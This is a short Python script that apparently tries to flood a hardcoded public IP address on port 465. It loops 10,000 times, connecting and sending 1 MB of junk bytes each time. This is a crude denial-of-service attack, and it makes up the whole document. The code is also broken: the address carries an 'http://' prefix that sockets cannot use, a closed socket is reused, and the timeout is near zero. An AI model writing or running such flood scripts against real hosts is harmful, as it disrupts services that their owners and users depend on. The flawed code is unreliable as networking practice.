import socket

ip = "http://5.10.249.41"
port = 465

payload = b"x" * (1024 * 1024)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(0.001)

for i in range(10000):
    try:
        sock.connect((ip, port))
        sock.sendall(payload)
        print("good")
    except:
        print("bad")
        pass
    finally:
        sock.close()
